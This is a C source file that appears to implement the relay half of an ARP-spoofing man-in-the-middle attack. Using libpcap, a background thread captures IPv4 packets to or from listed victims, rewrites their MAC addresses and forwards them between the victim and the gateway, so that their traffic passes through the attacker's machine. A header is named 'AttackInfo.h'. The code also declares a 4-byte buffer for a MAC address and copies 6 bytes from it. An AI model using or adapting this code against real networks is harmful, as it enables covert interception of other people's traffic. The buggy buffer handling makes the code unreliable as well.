#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <pthread.h>
#include "InitPcap.h"
#include "AttackInfo.h"

pcap_t** gPcapHandle;
BYTE gLocalMAC[6];
BYTE gGatewayIP[4];
BYTE gGatewayMAC[6];
BYTE gLocalIP[4] = {192,168,62,142};

void PacketCallback(u_char* args, const struct pcap_pkthdr *header, const u_char *packet)
{
    // check if dst ip is not me.
    // check IPv4
    int result = 0;
    if (packet[12] == 0x08 && packet[13] == 0x00) // Type : IPv4
    {
        BYTE victimMAC[4];
        // sender -> receiver
        if (memcmp(&packet[30], gLocalIP, 4) &&
            IsInTable(&packet[26], victimMAC))
        {
            u_char* temPacket = malloc(header->len);
            if (temPacket)
            {
                memcpy(temPacket, packet, header->len);
                memcpy(temPacket, gGatewayMAC, 6);
                memcpy(&temPacket[6], gLocalMAC, 6);
                // change mac address.
                pcap_sendpacket(*gPcapHandle, temPacket, header->len);
                free(temPacket);
            }
        }
        // receiver -> sender
        else if (memcmp(&packet[26], gLocalIP, 4) &&
                IsInTable(&packet[30], victimMAC))
        {
            u_char* temPacket = malloc(header->len);
            if (temPacket)
            {
                memcpy(temPacket, packet, header->len);
                memcpy(temPacket, victimMAC, 6);
                memcpy(&temPacket[6], gLocalMAC, 6);
                // change mac address.
                result = pcap_sendpacket(*gPcapHandle, temPacket, header->len);
                free(temPacket);
            }
        }
    }
}

static void *ThreadFunction(void *arg)
{
    gPcapHandle = arg;

    pcap_loop(*gPcapHandle, 0, (pcap_handler)PacketCallback, NULL);

    return 0;
}

int InitPcap(pcap_t **handle)
{
    bpf_u_int32 mask;
    bpf_u_int32 net;
    int result = 0; // need to constant
    char dev[] = "eth0";
    char errbuf[PCAP_ERRBUF_SIZE];
    pthread_t threadId;
    pthread_attr_t attr;
    int s;

    if (pcap_lookupnet(dev, &net, &mask, errbuf) != -1)
    {
        //*handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf);
        *handle = pcap_open_live(dev, BUFSIZ, 0, 0, errbuf);
        if (*handle)
        {
            if (pthread_attr_init(&attr) == 0 &&
                pthread_create(&threadId, &attr, &ThreadFunction, handle) == 0)
            {
                result = 1;
            }
        }
        else
        {
            fprintf(stderr, "open_live error: %s\n", errbuf);
        }
    }
    else
    {
        fprintf(stderr, "Get netmask fail: %s\n", errbuf);
    }

    return result;
}
